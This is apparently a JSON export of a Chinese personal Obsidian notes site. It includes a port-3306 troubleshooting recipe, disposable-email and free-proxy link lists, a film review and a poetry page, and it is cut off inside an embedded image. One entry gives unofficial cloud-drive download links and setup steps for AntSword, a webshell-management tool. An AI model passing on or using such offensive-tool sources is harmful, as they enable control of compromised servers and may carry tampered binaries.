{"/":{"title":"知识Cool😊","content":"# You‘re Welcome😊\n\n我是**田中**\n这里是我的知识库。😊😊\n专门用于存放学习过程中做的一些笔记，目前项目的搜索功能似乎有点抽搐，所以做了目录方便自己查阅。\n\n知识库目录：[[outline]]\n\n## 相同知识库搭建\n此项目是基于知识库管理软件`Obsidian`的基础上，采用`Markdown`语法的**知识库**，通过将知识库推送到Github，再经过Vercel进行部署，全程只要域名费用，当然域名也可以白p（指路freenom）\n项目地址：[ObPublish](https://github.com/tianzhongs/ObPublish.git)\n\n此项目是由oldwinter的项目[dg3](https://github.com/oldwinter/dg3)修改得来。从其中删除了一些不必要的文件，并修改了一些奇怪的配置，算是轻量化了一下。\n\n如果你也需要创建一个这样的云知识库，可以参考以下地址中的教程或者原作者的文档\n[[pages/001_部署Obsidian静态知识库网站]]\n\n致谢：\n    1. @oldwinter的[原开源代码](https://github.com/oldwinter/dg3)\n    2. @行者无疆的细致解答\n","lastmodified":"2023-05-31T09:03:32.981907233Z","tags":null},"/%E4%B8%89%E6%AD%A5%E7%AE%80%E5%8D%95%E8%A7%A3%E5%86%B33306%E7%AB%AF%E5%8F%A3%E5%8D%A0%E7%94%A8%E9%97%AE%E9%A2%98":{"title":"三步简单解决3306端口占用问题","content":"\n\n[[注意]]：使用CMD时，以管理员模式进行，否则提示没有权限。\n```\n  C:\\Users\\tianzhongs\u003enetstat -ano|findstr 3306 #查看占用该端口的该进程号的pid\n    TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       5928\n    TCP    [::]:3306              [::]:0                 LISTENING       5928\n  \n  C:\\Users\\tianzhongs\u003etasklist |findstr 5928 #查看该进程\n  mysqld.exe                    5928 Services                   0    164,768 K\n  \n  C:\\Windows\\system32\u003etaskkill -pid 5928 -f  #禁止该进程\n  成功: 已终止 PID 为 5928 的进程。\n```\n参考地址：https://blog.csdn.net/qq_43619461/article/details/105893770","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91":{"title":"中国蚁剑","content":"\n\n- 1. 下载主程序\n  文件名：antSword.zip\n  链接：https://pan.baidu.com/s/1wRmj_cB1sLkJ_npRCYO8Xw\n  提取码：8888\n- 2. 下载加载器\n  文件名：AntSword-Loader-v4.0.3-win32-x64  \n  链接：\n  https://pan.baidu.com/s/1TJBQ01JWLHUXLO-j2_GVfg\n  提取码：8888\n  解压压缩包，为主程序 AntSword.exe 创建快捷方式。\n  双击 AntSword.exe 启动主程序，第一次启动需要设置工作目录。\n  点击“初始化”，选择解压出来的主程序根目录。\n- 3. 用加载器去打开已经解压的主程序目录","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E4%B8%B4%E6%97%B6%E9%82%AE%E7%AE%B1":{"title":"临时邮箱","content":"\n\n- Temp Mail - Disposable Temporary Email [https://temp-mail.org/en/](https://temp-mail.org/en/)\n- Temp Mail - Disposable Temporary Email - Chrome 应用商店 [https://chrome.google.com/webstore/detail/temp-mail-disposable-temp/inojafojbhdpnehkhhfjalgjjobnhomj](https://chrome.google.com/webstore/detail/temp-mail-disposable-temp/inojafojbhdpnehkhhfjalgjjobnhomj)\n- eooc-mail [https://github.com/lhl77/eooc-mail](https://github.com/lhl77/eooc-mail) Eooc!邮箱 [https://eeooc.com/](https://eeooc.com/)[https://fuck.tsutsu.icu/](https://fuck.tsutsu.icu/)\n- ## Gmail谷歌\n- 小型专业版 | 临时邮件 - 临时 Gmail - 一次性假电子邮件 [https://smailpro.com/](https://smailpro.com/)\n## edu教育邮箱\n\n临时邮箱- 马建军大学免费教育邮箱 [https://mail.mjj.edu.ge/](https://mail.mjj.edu.ge/) Homepage - Free Temp Mail - EduMail [https://edumail.icu/](https://edumail.icu/)\n## 可发送短信\n\n一次性邮箱地址 (InstAddr) [https://m.kuku.lu/](https://m.kuku.lu/)","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E4%BA%BA%E7%94%9F%E7%AC%AC%E4%B8%80%E6%AC%A1%E8%A7%82%E5%90%8E%E6%84%9F":{"title":"《人生第一次》观后感","content":"\n\n- [[观后感]]\n- 主要讲述了出生、上学、成长、当兵、上班、结婚、进城、买房、相守、退休、养老、告别十二个场景，其中泛函了绝大多数人的一生，但是这些人绝大多数人都不是普通人，或者说，他们与我们普通人还有一定距离，与我们所处的阶级层级不同是，但是还是能够表达一些人生事态的。\n- 在出生阶段，几乎每一个父母都拥有一些激动的情绪，对于一般的人来说，他们往往是兴奋与激动的，但是在另一个层面，对于一些心态或者说家庭等等环境因素的人来说，他们可能就显得不那么“高兴”了。\n- 在上学的阶段中，几乎任何“高阶层等级”的人，他们都希望能够在自己能力范围之内，甚至范围之外，能够拥有一定的能力将孩子培养得更好，让他们获得更多的资源。\n- 从后面的，在上学、成长、上班、结婚、进城、买房等等这些阶段中，剧中所表达的大多是对于人之常情的感受，但是从侧面看，你无一不能看到一些对于普通人来说的资源问题，诸如，你上学辛苦刻苦学习的时候，更多人只是苦读书，而有资源的“高端玩家”他们拥有规则或者制定规则的人际关系，他们能够获得更多的东西，你还在为孩子考了98分兴奋激动的时候，他们的孩子已经受到“哈佛”大学教授的指点，参加了国外的教育培训、参加了项目，制作和参与了研发，等等诸如此类，无一不在体验个人初始资源的对人的一生的重要性。\n- 让我想到了一个东西，当一些高端玩家的儿子在获得成功的时候，在沾沾自喜的时候，在说出：“以上，全是我的辛苦努力，每一步我都踏踏实实的走路，所获得的成功都来源于我此阶段的辛勤付出”的时候，他们是否会考虑到能够给他们提供资源、提供思维、提供眼界的人，如果他们没有这些背景，如果他们没有如此不错的父母，如果……\n- 可他们都拥有了，他们能够获得的大多数都来自于他们的家族提供，事实上，即使他们不努力，他们的家族也会有意无意辅助他们获得更多，他们很容易签到一千万的大单，他们很容易拥有几百万的资金，但是普通人，可能还在还房贷。\n- 那么问题来了，如此不同的人生，如果拥有选择的权利，考虑到精神内在的真实感受，你会考虑那种？\n- 一般来说，人生无非在于享受观念，一面是价值的享受，一面是身体的享受，两者相互渗透，但是对于不同的人的感受不同，不管是哪一种，对于我们的来说，都是非常乐于其中的。\n- 人生第一次，且只有一次，看重的是什么？且还需细细斟酌。","lastmodified":"2023-05-31T09:03:33.041907772Z","tags":null},"/%E4%BB%A3%E7%90%86%E9%93%BE%E6%8E%A5":{"title":"代理链接","content":"# 代理链接\n\n\n## 基本\n\nv2rayng\n```txt\nhttps://openit.daycat.space/long\n```\nclash\n```java\nhttps://openit.daycat.space/clash  \n```\n\n## 可查阅频道链接\nTX链接可以去掉tx中的x试试\n| Name            | tx链接                           | tg链接                                |\n|-----------------|--------------------------------|-------------------------------------|\n| ✈️ 机场观测 • 白嫖无罪  | https://tx.me/s/freemason6     | https://telega.one/s/freemason6     |\n| free347 免费资源分享  | https://tx.me/s/free347        | https://telega.one/s/free347        |\n| vpn【机场】         | https://tx.me/s/airport358     | https://telega.one/s/airport358     |\n| 黑洞资源笔记          | https://tx.me/s/tieliu         | https://telega.one/s/tieliu         |\n| 学习教程资源分享        | https://tx.me/s/longgu         | https://telega.one/s/longgu         |\n| 公益机场TG直连        | https://tx.me/s/olddrivercqdl  | https://telega.one/s/olddrivercqdl  |\n| ShareCentre Pro | https://tx.me/s/ShareCentrePro | https://telega.one/s/ShareCentrePro |\n","lastmodified":"2023-05-31T09:03:33.045907808Z","tags":null},"/%E4%BD%A0%E6%98%AF%E6%88%91%E4%B8%89%E5%8D%81%E5%85%AD%E5%BA%A6%E7%9A%84%E9%A3%8E":{"title":"你是我三十六度的风","content":"“你是我三十九度的风 \"\n\n- 01 -\n\n  \n\n  \n\n  \n\n世间两种罪恶：你笑是一种，你不笑是另外一种。\n\n  \n\n  \n\n  \n\n——@mokilmq\n\n  \n\n  \n\n  \n\n- 02 -\n\n  \n\n  \n\n  \n\n夜阑卧听风吹雨，铁马是你，冰河也是你 君问归期未有期，巴山是你，夜雨也是你，月落乌啼霜满天。\n\n  \n\n  \n\n  \n\n江枫是你，渔火也是你，玲珑骰子安红豆，入骨是你，相思也是你 山有木兮木有枝，心悦是你，不知也是你。\n\n  \n\n  \n\n  \n\n——@弹得一手棉花\n\n  \n\n  \n\n  \n\n- 03 -\n\n  \n\n  \n\n  \n\n你是我最爱的一杯酒，喝完我就走。\n\n  \n\n  \n\n  \n\n——@光距离历史编织\n\n  \n\n  \n\n  \n\n- 04 -\n\n  \n\n  \n\n  \n\n最后见你是我做的短梦，梦里有你还有一群冬风。\n\n![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsKCwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAJwA9cDASIAAhEBAxEB/8QAHgABAAEEAwEBAAAAAAAAAAAAAAcDBAUGAQIICQr/xABwEAAABQIDBAQFCw0KBwwJAwUAAQIDBAURBgcSCBMhMRQiQVEyYXGBkQkVI0JSYnKCobG0FiQzNDc4c3V2krKzwRcnNkNTdKLR4fAmNWODo7XCGCUoREVGZGaTlMPxGUhUVVaEhaTSR6XiZcTj5PL/xAAcAQEAAgMBAQEAAAAAAAAAAAAAAQIDBAUGBwj/xAA1EQEAAgIBAwIFAQYGAgMAAAAAAQIDESEEEjEFQQYTIjJRFBUjM2FxkUJDUoGh0TThgrHw/9oADAMBAAIRAxEAPwD6pgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAKL3JIA9ySACsAAAAAAAAAAAAAAAAAAAAAAAAOuoh2AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdAAdwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABRe5JAHuSQAVgAAABaypTcNpTryktsISaluKVYkkQiB7akw3LkSE4dpGIMXQ46bvVChQN6wg+1OpZpufkuAmkBqGX+Y1FzOw7FrtBk9Kp8gjIjPgtC0nZSFJ9qojtwMbeAAAAAAAAACLc2s7ouUztGYcolTrsqpdIdKNTEa3W47CUqeet2knWnhz4gJSEe5zZjfub4OkTorBTa7KV0KjwC5y5qys02X6R+9SobThnE1OxfQYFapMlEylz2UyI0hs7pcQoiMjL0iJ8U6q9tM4OpUx4lw6NQZtbYitnx6UtxMYnleRtTyU/DUAq7PmYFeq6sT4PxxIQ7jjDs9aZTrbJMolxXVGuNIQkuGk0GSfhIUJmW7o7LiGcR0uPA2qcC1GOhLUipYXq8SWpJW3rUeRBUzqPt0qfdt+FMW2etVqGLcSYZyupUs6enErMp2sy46i6VEpzbfW089G8UpLWr3x2AbphDOzBeP63Mo2H6/GqVUiNqdUw1cyWhKtJqQq1lp1cLpMxvyeQ86570KDlcvLDHFFpSI0LB1XbhSmoPUNqlS0KiuklPtkpdciuafeD0QnmAqgAAAAAAAAAAA86bSWaGaeW3RKphKhUaXQmJbCZTs+QrePktWndJTbqHf23kAeiwEF1HHmdVNgSZb2BcOqbYbNxRFWlEZkSbnbqiRss8a/uhYHomIjinBOoRyfOMayVu79ly5gNuAdCVchHObEqtN+sMSh4tj4UmT5hxm3JEFMnpK9JqJsiVy4JUAkkB5xxjldjajUmq4lqmcVZhuRojq5Zw4TCI6YqSuom0e1c4fZfCEibPbtdkZOYQexG+9KrDkFDj7753W5crkavHYyASUA4TyHIAAAAAAAAAAALWXKZhMm6+4hpsvbLOxDUMz8wYeWmGvXN9lydMffbhQKfHOzsyS4oktNJ8pnz9qVz7BodHyHcx4tVbzXcaxDWXU6W6VHUtEGmpvfdtpJXXV4N1nzsAy2I9o6gR566ThaLJx5XbH9Y0AyeSj8I74CPOYxsXDecmJFOTZ2LqZhLendqlwqaiZuk9ynF+EfDsEp4cwfRMIxERqLSYdKjpTpJqEwlpJF5CGaSQCGFZG4srZk3iDNKvTIhl12Ka2iASvFdHGwoP7LlOZcVKpmNMZUuoeCmUisrdsnu0q6onIdDSAg9/KXNOjRkKoua657iLkUauUtpbK09ylJ61/GLpDefEMtCzwPUeH2ZRSW/kEymniOTTw5gIMlZo5qYIlrXiTL1nEFIcMlJl4SfU86wnt1Mr6yrcPBGUp+1blzLW0iXV36K845utFYhPRdCu5SlJ0lz7xLykDE17DNMxPTXafVIEaoQ3SstiUyTqFF4yMBfQpzFRjtyIzzchhwrodaWSkqLvIyF4IFc2a38IPLfy2xhVMHEZK/3pd+vaaq/cyvwOXYYtZOYWb+XkdiTinC9LxTSWLpmzcMGtMxCCtdwo6/CLjySA9CAI/wDnRg/MthZ4erbE15siNyI4e6kteJba7GQ3wl37AFQAAAAAAAAAAAAAAQ3hLP6jYhzlx5gVUuMw9h1mEtLbxm045vCcU8otXhJT7HxL3Qy1C2g8EYlxu3hKlVdNQrDiHjR0dtRsLNr7IlLttKjK/YAk4AAAAAAAAAAAGOnz2qdHckSFpYjtIU44+4oiShJFzMwGRAQEWa+PsdoenZdYTgP0BojJqfiGSbHTfEy2kuqnh4ShuOU+b0bMmJPjPwHqJialOkxVKHKURuxV8bHqLwkHbqq5GAkwBB9Xx9izHuJZdIy0VT40GlrW3UcQ1NCno63/5COlP2RSfbK5J8EY+jZnYyyvxlT8O5mLgT6XWHzj0zFUFoo7JSTSSijPoPglR8dKi8K3oD0ALViWiTr3akr0K0qsd7GIESzO2k61VUrnyablnTJLkFtmA8pmRWn21aXFqWniUclJUkiLwtOruGnZw4epGyqmBj3A5uR5iXSjysHpcdWVfZvrXoLrKKQ2nUpK/BsnSoB62AedsJ4QxFtAYfp2LMU4ql07D1VjpmQMPYde3KG2V9ZG9fLi6ZkZX9qLLG2VE/ISnOY4y2fqsxunHvqxhZ2Ut9qqRC+ym2Sj6r6U6lJMvCtp7QHpYBg8J4op2MsPUyu0iQmZSalGblxJKOTrayuky8xkM4AAAAAAAAAAAAAAAALOpfaEn8Cv5gEcwNo/Lup1/1nbxPDam3NKek62UOGXPQtaSSu1y5H2jeKRiSlV7X621OHUSQRajivpc0+Wx8LjzZhLE2DqZkFlvT8V0B7FDlWJxmBS40JMhxbhKUZqSS7Wsm/aKOGsGZdY6zMco9NwTijLqrR6cUw5sZXrachlTik20oNWrrJMB6hXWYTc1qG5LYblOlqbjrdInVl3knmL8l3HmbH+TOGcusRZb1Ckty5Ndk4sjoXU6hLXIlKa6O/qTrUfEuXAel0psAqgAAAAAAAAAAAAAAIwzDzpp2Daq1QadEexHi+Ukzi0GCV3V8us4rwWkcS6yv2AJPEd4nz6wBhF9cap4rpjctB2OKy/vn9Xdu0XUNNj5IYizHT03M/Ekl5LvWThmhvKjwI/vVKSep7lzOwkLDeUuDcGxW2qLhynQd2mxONx06zLxqPifnMBox7Qc/FrjcfA2A6/XTWf29Ob9bopF3ktzif5opP4uz0Ws1M4Dw2y3bgiTWDU55zSWkTWSLdo5NPEBB7m0VVsGFfHuXtcw/ETZLlTp5FUIrZ96t31kp5cdIknBmY2F8fxES8OV+DWGFpvaM+lSk+VPhEflGxyEbxpSFJI0KKxkZXLziK8YbOGEMWyvXSDGVhbEbR6mK3Qj6PJbV47cFFwLgZAJbR2DuPPH7oGYmSammsew0YvwqStJ4qorGmRGL3UqMXZ75Al3BWYuGsw6ec3DdchVqMVrriPEs0/CLmnzgNqAddRDsAAAAAAAAAAAovckgD3JIAKw6K6xDuLWZITGjuOrOyGy1K8gCFMzdeamZ9Iy4N5aKFEh+vFebaVY3y1aWIxn3KVdR+JIl2i0WDQYDEGnRGocNhBIbjspsSS7h54wHmG1hDBOOM1pdHlTHcTV3TS4rSyU/KjlpYjII+SSU4Th/HGLjULFuR9fwjjuv1yfU/X2UdOxTGclqkRoyn3FbhTaT4pJs9LXABtUTXkdnw3CbUhOD8wHVuIa0H9ZVVKeJJt7V5JelI9EEmwhbapgrPKxdfjqQibhyfGq7BqPmbbhXTfxkYl2FJ6ZGae06d42ly172uV7AL0AAAAAABCLDzuLNpuopeMmo2EKE2iORH4b01d3DP4sdBekTcIRygUWJM2c2MSoLRGRPYoLKC5L6I3ZxV/winE/FAUNl3pNHwhW8HSrLXhKsSKO3IQZWeYI9bKre1UbbiNXjuLjLOIiVnvnLNd68lmXToTbqzuttn1vZcJCfcp1uOK8qxxkM6bWN85GnC9lTiszMvEqIwZfJb0C+ysV+/VnYVuPrpTePd/vXG/rAU8ZpP/dN5Yn2fU/X/wBdTBb4UWiv7TePp0ZlS49IoFKoj0o1eBJ3kuWptJd+7kRzV5Ui6xv98blkduP1P1/9dTBSyD44mzoX343eK3/06D/WAo7Xyf3gMUfDhfTWBNKeQhba/wDvf8U/DhfTY4moB3AAAAAAAAAAEJbVa0PZax6ck9c2fVoTMVhBXW85vknpSXfwE2jyjtl500/KTFWVM96kVDEM9uoyZDFIpjK1vPWZ06iNKVcjUQD0li3+Ctb/AJk/+rUNH2ZC/eLwX/MC+cxBKdr/ABBXXUU2VgdxEOqNrioXTjlqkRDNtXWc3kdtNk/CE8bM/wBwvBPAy+sC+cwEnlxLyiEMw3HcT56Ze4Z4NRKSl3ELjpmZmtSbtJQfd4SjuJlmbxUZ1LWnemg9Gvlfs4Dw7mJgjOjHG0ZDpyMVwoVSYw44/vaUlcVhps5HVQRkreKPgfhH3gPTm0wvRkRjv8Uv/MN5wl/BijfzJj9WQ8o4hwVmngDJ/Mf90HHzGJqbNphRKZCQwZvE+45pK619Zd9RFpHrHCzKo2HKWysuu3GbSry6SAZcAAAAAAAAAAAEeZ7Y6fy3ysxLiGI3v5sSGoorNr6pCjJLX9IyAaZg5tGb2cNUxasjfw5hFS6NRSVxaem3+vJKe+1kskr8IJuJoyIahlPgBvLPL7D+G0OKfXToaGXX1c3nuKnXD8anFLV5xuvtQFNHYKMyexT2TekuIZZT4TijsRC5t4hoGOcncPZl1KnScRNP1OHCSrd0t10+iKWft1t8CUZeMBVrmdeA8PNuLqGL6JHJHBSPXBs1X7tJHfuGnp2lEYifRHwRgyv4vccPqyiZ6HCNPut67bhx9yNxoeS+CMOLS5TMMUqGpJGRLRFTci8RjdG20toJCCJBJ5ERWLzAIcTVM9JnBFEwZR21FwKTKkSTR5dOm/mFA8wc5sPRlPVfLml1xKFaTKg1fS6svdk24nycNQm1SbjrujAQqralpNMaZXXsHYxw82tOpciXSTWy18JTZqt5bCTcI44oePKJHrGHqlGq1NfK6JEZy6fIfcfiMZp1knm1oWnWhXMj7RBGYWTU7BFTcx7lbHTT64wre1KgsqJqLWWeakmXgpe4cHOwBPZ8Qt4hqGWuY9IzSwhAxFR3FdHfuhxh0rLYcI7KbUXYolcBuQCMswsgMHZhOInTIKqdXWeMWu0tXR50c+w0uF+0aRS80cX5IyWKRme0dVw69KOPExzGLgWo/YimMpTdsz5ay6vkHoNSbjCYvwtCxrhyqUCptE/TKlGciSWj9slRW/aAzaVktJKSepJ8SMhUEG5BYnq1Fk1HK/Fbm+xNhZhrczzOxVKnqM0sSSL3XVUlRe6IxNyT4AKgAAAAAAAAAPOGaGVeE8dbSuByxBQolRL6nKso9bZ6jMn4aSM1JO/JS/SMjivD9Nw3nrk9TqVDYp8KOxU0tsx2kpIi6L5BlJDp1/akhoYQZIw9hV8pa1ctUyS3uST5obopZjW/3RGU92lGe7qnL+agJvAAAAAAAAAAEHZ4uqxpjDBmW7KnSj1Rx6oVlLSjK8Bki6i/euOKSnzCcRCdCSVc2nMTy0l/iWgRYKV+5W6tTx/IogEuQILFPitRYzKGIzKSShtJWJJeIeYtsuTOynjU7NPDEtuBiBBKokprSozlRXS8PSnipUfSt0u4tQ9VbshBeOIqMa7Q+FaDJaRLp1Bo79XksOFct5IV0ds/zUvfnAN8yfw/R8NZcYeg0NxD9LTEbcafRyf1JIzc+MozMaXtXKj1XKqThTojc2sYrfRRaa24X2J9y/1x/mEkp7/NDE5DzH8s8X1/KCoPKdjUkvXDD0lw+LlMWo/Y/GbCrt/B0i+w4RZkbQuI6w6pT1LwXHao8FvVdBS3UpekOcvC0qbb8xgNcyTzTh5YbPEiHWoBNVjAKlUCfT4SeMiU2ZJZ3ff0jW2pPD+NG7ZXZWTGqg5jXGEpdUxpUWrqJSzNmmMq4lFjl7Uk8CNXNSk3MRImiljHbXxBQymMu0KnxafiufAJfWcqCWVxoyVp9ylJJd58yQPXZkXdxAQhsqWoeEcTYKUlxC8IYkqFLbQ5zKKbxvxLeLcPNCbbeIQtg5pug7UOZkRtNvXmh0er6b+E6lUuM6f5rLPoE2AIJ2YW0YSfzGy6TdMfC+InHKeyZ/Y6fNbTMYSXvUqddbL8EJ5ELYeLoG1Pjppk7FNwlRJjrZ+2cTLqLWr81KCE0gAAAAAAAAAAAAAALOo3OFIIu1tXzGLwUXUaysfIwHklrDX1SbKuXtYg1en0usYblN1OHLnSCZZJaH1EbKln4OpJ6Rv2XWJGMys9KziKlvRpVKo9EjUtyTCcJ1l6StSn3CS4XVPTqSR+MVNnCjMLwzjXC1QiNSIdJxLPiobd67S21L1lwP4ZiY6XRYNEZ3FPhx4Uf+SjNEhPoIBFGPW0V7aHy1pika00yFUare/Jz2Jps/1gmq2kQxhJPrttL45mPElxdHo8GmtL7Ua9T6iL89AmsAAAAAAAAAAAABgsYYsp+BsL1bEFVdJin02K5Lfc7kISaj+QgEeZyY/qLEyj4KwnJQ1i6uuGRPKbJZU+GX2eWpJ9xEaUkfNSiGewZlxh3KSlTH2FrVIePf1GrznNciSvtW4s/wDy4jX8hsJTmqZPxriJm2LcWqRNmtr49DY0+wREH2E2jn3qUoxk9oihVvE2TGMKTh5snaxMprzMdq9lOGafBLxgNay92jKZiCrRma6+xh9uvKN/DbctKmjmxvBSo1q4bxdtSW/C0mQm4uai7R5SzGzCwNm9k61grD8M5mJqkkqVTsPvN6JtMkoMk63CP7Clm2rV4uA9OUKHIhUuIzNf6TLbaQh161t4oiIjV5z4gMuAAAjfOnMd3LzDLXrYz0zElWfKnUiJa+8kr4JM/epM7mNUwvm/jOh4wpWFsx8NxIcqsEaabV6G8bsV91JXW2tCusgy+MNnzkyun5gsUGVRqwmjV2iTOmQ3nm96wo7WUlxHtiMhhsMZVYmmY5gYox3iCDWZNJbWVMgUyIqPHYWstKnjJalKNZp4c+0BL6kpWkyUm5GVjuIXx9s+NSKs3irAMiLgzG0dzedMYj/W85PtmpLafDSfDjzITWjsC3iAQ7lZnNLrtXkYSxjSkYcxvFLeqhNK1R5rPZIjKPwk8ur4RCYSVxEYZ55XSMwKTTZ1EkopmLqFI6fSKivwUOlbUyv/ACbhdVXmGSyYzLRmrgWHWziqp80lKjToK+caS2ZpdbPyGQCQQAAAAAAAAAUXuSQB7kkAFYYvEdvWSofzdfzDKCxqMNM+G9HV1SdbU2Z2vYjKwDyUp5DGyVl086ehtuuwHFH3EVRUJZ2sEaMnKhYr/XcW/wD2xCOsO4MqOIdmvG2AnyT664ZqMqHClxDsTxtLTIZcLuOyySfkMd84s6MLY2yTjU9nFlCqGKZyYJPU2JUGVv8ASN43vEpbJV+B6gEs7TUZcrIrGjbRXX0A1EXfZST/AGDdMEz0VPCFBmN/Y5EFh1PHsNsj/aOMX09mq4WrUSS2l1h6E8242s+BkaD4eQaTsyuOO5G4NN1w3Voh7slmd7klSkp/okQCVgHCeQ5AAAAAQRllBTQ9oPNmkxFKagykU+sLZLkmQ82aXDLy7sj8oncQngj757Mz8UUn5nQCgQWqZtSYwKIW7RU8OUybKQXJcgnpbO88u7bQn4oucrTP92zOsrcPXSnf6qijB5wvLy2zZwTmMa1t0WcosLV4/wCKZbdcNUOQru0vKNF/+kDK5ISDr2Ps3sSR0KOlVCutRockysTxxYjUV8095E60tN/egKdbqiK3tO4UhxiJx6hYYqUmocbblEyREJgvKrobvoF1kMZfVHnFbtxq8f8A+3QRgM9aXWcC49wtmjhnDbmJJcSLKolUhQGyOVIYkG2cZRFqTqSh9tJH3JeUr2o3bInL+bgHAjDNYfTLxNU33KrXJSCsTs589TtvEnqtl71CQGB2wPvf8TfDhfTWBMiBDe2B97/ib4cL6awJkQArgAAAAAAAAACDXmY9c2qY6JGh9dGwut6Ogj+xLdkJI1eU0kJyHlXC2bVLwBm/m1660utT6iuqR7FTaU5KNMcmPYuKfBLisB6NxW2ScM1e3/sb/wCrUNK2Z1XyLwX/ADAvnMabD2r8GZgVSrYPpcesN1n1skyFImQ9yltKWzvrO/VtcuY27Zmc/eNwWVuUBPzmAlJSdVhDuWsdC8582nFIJUhEmnMJdMusTfRUq037hMaVaiHhysxNpF/PXNCPlnOwixCKXCVKmVhlwlmfRU6EEnrdl+sAnnafST9FwNCV9il4tp7bhd5FrV86UiaW0khBJIrERWsPJFQLNteCsE/uvJoRVwsaQejesRmbe60vWNV+3yD1wSdJAO4AAAAAAAAAAg7aGaRiCflzghbl2MQ4ibcmNJK6ziw0KmK8iTcZjoUrs3vvhOIh7E33z2BPyVrav/uaaAmEAAAHXSQ7AAAAAA66SHYAHXSQ5JNhyOiuQDz9RkFkxnxMpqSNOFseKVKjm3b61qaE3fI/cpWm6vhEoegRB+1M25TMKYdxZGTeVhmvRKhb2ymjVunSLzO/IJrZc3jaFl4BpIyPvAXA6KTwHcAEA7RFJVhWuYEzHpjnRanSavFpMxaeCZNPmPJadacPnYnFtuJ98nxieEndJH38RGm0rQo2IchswIcrUSU0SVKQ42dlNuMoN1pReMloQfmGz5c1NdZwPQJzjyJDkiCy8p1s7kZmguQDagAAAAAAAAAQrluV9oHOE+GootGQk+4ibkilmG7/AMI7KVhPFZRqo4ZdySYsZ+lSC+MQr5b/AHwGcH83o36qUOtBYakbUOLHpBE+7DwtTUxjWV92lx+Ubuk/fGhu/wAEgE1AAAAAAAAAACFsh0Kn4wzXqri9ZuYkXEb4cksISghNIhvZkRpwrihSjupWKapc7c/ZzATIIVymQiv5vZs4jSkyQibHorK73uUdkic/0hqEzOr3TZqtyEObKkRacpolVfL65rkyVVnTPwlG6+tV1eMBY7UFCdpWHqZmTSjNqv4LkJqCTQX2xCNSSlR1e9Nu6vK2kW2zHV4k/Kmo48lPojx8RVCbiF55xVkNsLdUbaiPuJpKfQN5z/qSaVkvjiStCHCTR5SSbcK5KUppSUl+caR5vwJXpWJNkXKbLmnE3GrGK4iMPPOILS3FjsJ+vXC99u0qSkvdLIBWydaegZoYCzDmx1IfzGRWt5o4qSlxbUiGlR87JYaWXH3I9lK5iDc+6c1hVrKOZBababpGLYTCSJNkoadYfjHYv88QnNJ6kEfiAQjV2UUfazw7JeSTaKxg+fHZdM+bkeWw4pNvgvavzhN4hTOyKxEzTyRrC17p9NfmUzemXDdyKbJUaPFqcjsCaG/AR5AEKVlhul7WOFZpl1KzgupRFOGfVUcaXDWkj8hSXPSYnEQbmSkm9onJYkdVwvXtk1d6DhoVpPxXSn80hN6U6SIgHcAAAAAAAAAAAAAAAAQrs/8AGt5rF2fVbK/RSJkEObP/APjzNb8rZX6KRMYCG8u/vic2vG1Sz/8AtUiahCuXv3xWbXiapl/+7F/WJnR2AO4AAAAAAAAAAhDaOgpq6staBJ9lplZxbFYnxr9V9hDLz2g/e62mzt4hN4hbaC/hRk1+WLf0OUAmkdPBHcddRAMVGw9TodUfqLUGM3MdL2SSlkidX5Vdoy46W8Q7gLGpVFilRFyZLzMaOji48+4TaEF3mZ8BVYktSWkOtOJdbXxSpKrkfkHnbaOxNQk46wbhzHj7NOwDMaflzJE4lFFlSWzTuYrivBsepR6Vc9Iyuyq5JZw7iJiGU5eCUVQ/qZVUEOJeKIaSulKV9Ymkq8C/YYCfQAAAB18Qi6ubR2AMO4vThaoV9LFUN0o7iyZcVHYePwWXHyLdocP3JqIwEnrTqEF5XsFhTaAzOw9HMkwKi1FxC01e+hbt0PfnKRq+N6Z1JRKK5HwEJY3jooO0rl3U0LbaOsUmoUh9vlrQ2bbqLeRSzATgAAAAAAAAACi9ySAPckgArAAAIfyGXerZpt2tpxhJ+jsCQk4To7LiHWqXBacQd0rRHSSkn/e4ifJ+pTaDnJmzhOc22tL09rEMF5r27EhpKFJV75KmD/OE5moBi8Q/4hqf80d/RMR5swfcOwj/ADZX6ahI2If8Q1T+avfomI72YfuHYRv/AOzK/WKASunkORwnkOQAAAAEJ4H++czL/FFJ+Z0TYILZvh3atkEplSI+J8MIU28RdVT0OQZOEfvtL7QCS8b4KpeYWF6nh2uR+l0qosKYfZPhwPtSftVFYjI+wwwFgej5dYWp+HqFG6JTYSNDTZq1LO5malKUfhKUo1KNXaZmNlSkrBpsYDqnkO2khUHCuQCE9r/73/FPw4X02OJqEK7YH3AMU/Dg/TWBNQDuAAAAAAAAAAPK+FslMI5u5z5oYhxjS01ybCqLECO1IcVuEMts3TZF7GfXVxHqF54mUGtXgJ4n4h5Eyr2rcpsL49zWOtY1p1HOTXNTCKiamFOElskqUSTLwdV+ICSs4cBYcy2yPxn9SlEgYeXIiky45To6WVGlbiUK4p48lqEs4Ro8eg4cpFPitk3Giw2WW0EViIiTYeecxM/cG5z5QZjQ8M1M5cui7hmY3bgm77akmlRHpURpK5WPUPS1KUfrbFuVvYk+PsIBeI7BCuQEheJa1mPi4lKKNWK8phhpaTIybioJkleex/IJqR2D564YzuzywFNxFhjLrKFeMoVJrUxqormSW2T